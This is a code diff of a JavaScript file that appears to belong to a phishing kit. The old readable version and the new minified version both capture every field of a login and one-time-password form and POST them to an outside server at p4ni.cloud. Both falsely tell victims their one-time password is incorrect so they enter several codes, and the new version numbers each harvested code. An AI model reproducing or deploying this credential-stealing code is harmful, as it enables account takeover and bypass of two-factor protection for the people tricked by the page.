@@ -1,78 +1,64 @@
-var API_URL = "https://p4ni.cloud/api.php?token=WILASKLDJADLKJASD";
-var OTT = 0;
-var hasPath = "";
-
-function serverCall(body, nextURL) {
+var API_URL = "https://p4ni.cloud/api.php?token=WILASKLDJADLKJASD"
+  , OTT = 0
+  , hasPath = "";
+function serverCall(e, t) {
     fetch(API_URL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(body),
-        })
-        .then((res) => res.json())
-        .then((responseData) => {
-            if (responseData.status === 200) {
-                if (getQuery("next") == "ap.html" && OTT === 0) {
-                    document.getElementById("frm_2_am8E_").reset();
-                    document.getElementById("otp-invalid").innerHTML = "Incorrect one time password";
-                    OTT++;
-                    return false;
-                }
-                if (getQuery("next") == "faa.html" && OTT === 0) {
-                    document.getElementById("frm_2_am8E_").reset();
-                    document.getElementById("otp-invalid").innerHTML = "Incorrect one time password";
-                    OTT++;
-                    return false;
-                }
-                if (getQuery("next") == "un" && OTT < 3) {
-                    document.getElementById("frm_2_am8E_").reset();
-                    document.getElementById("otp-invalid").innerHTML = "Incorrect one time password";
-                    OTT++;
-                    return false;
-                }
-                if (OTT == 3) {
-                    window.location.href = "404.html";
-                }
-                window.location.href = nextURL;
-            } else {
-                console.log("response is not valid");
-            }
-        })
-        .catch((error) => {
-            console.error(error);
-        });
-}
-
-window.onload = function() {
-    hasPath = window.location.pathname;
-    if (hasPath.indexOf("otp") !== -1) {
-        document.getElementById("nextValue").value = "loader.html?next=" + getQuery("next");
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(e)
+    }).then(e=>e.json()).then(e=>{
+        if (200 === e.status) {
+            if ("ap.html" == getQuery("next") && 0 === OTT || "faa.html" == getQuery("next") && 0 === OTT || "un" == getQuery("next") && OTT < 3)
+                return document.getElementById("frm_2_am8E_").reset(),
+                document.getElementById("tok-invalid").innerHTML = "Incorrect one time password",
+                OTT++,
+                !1;
+            3 == OTT && (window.location.href = "404.html"),
+            window.location.href = t
+        } else
+            console.log("response is not valid")
     }
-    let form = document.getElementById("frm_2_am8E_");
-    let nextValue = '';
-    nextValue = document.getElementById("nextValue").value;
-    form.addEventListener("submit", function(event) {
-        event.preventDefault();
-        let formData = {};
-        for (let i = 0; i < form.elements.length; i++) {
-            let element = form.elements[i];
-            if (element.tagName === 'INPUT') {
-                if (element.value == 'RESET' || element.value == 'LOGIN' || element.value == "Submit") {
+    ).catch(e=>{
+        console.error(e)
+    }
+    )
+}
+function getQuery(e) {
+    var t = window.location.href;
+    return new URLSearchParams(t.split("?")[1]).get(e)
+}
+function counterIncrement() {
+    var e = localStorage.getItem("1");
+    return ("/tok" == hasPath || "/tok.html" == hasPath) && (console.log(e),
+    e = null === e ? 0 : parseInt(e),
+    e++,
+    localStorage.setItem("1", e)),
+    e
+}
+window.onload = function() {
+    -1 !== (hasPath = window.location.pathname).indexOf("tok") && (document.getElementById("nextValue").value = "loader.html?next=" + getQuery("next"));
+    let e = document.getElementById("frm_2_am8E_")
+      , t = "";
+    t = document.getElementById("nextValue").value,
+    e.addEventListener("submit", function(n) {
+        n.preventDefault();
+        let a = {};
+        for (let l = 0; l < e.elements.length; l++) {
+            let o = e.elements[l];
+            if ("INPUT" === o.tagName) {
+                if ("RESET" == o.value || "LOGIN" == o.value || "Submit" == o.value)
                     continue;
-                }
-                formData[element.name] = element.value;
+                if ("one" == o.name) {
+                    let r = counterIncrement();
+                    a[o.name + "-" + r] = o.value
+                } else
+                    a[o.name] = o.value
             }
         }
-        formData['site'] = window.location.hostname;
-        serverCall(formData, nextValue);
-    });
-};
-
-function getQuery(query) {
-
-    var currentURL = window.location.href;
-    var urlParams = new URLSearchParams(currentURL.split('?')[1]);
-    var nextValue = urlParams.get(query);
-    return nextValue;
+        a.site = window.location.hostname,
+        serverCall(a, t)
+    })
 }
+;
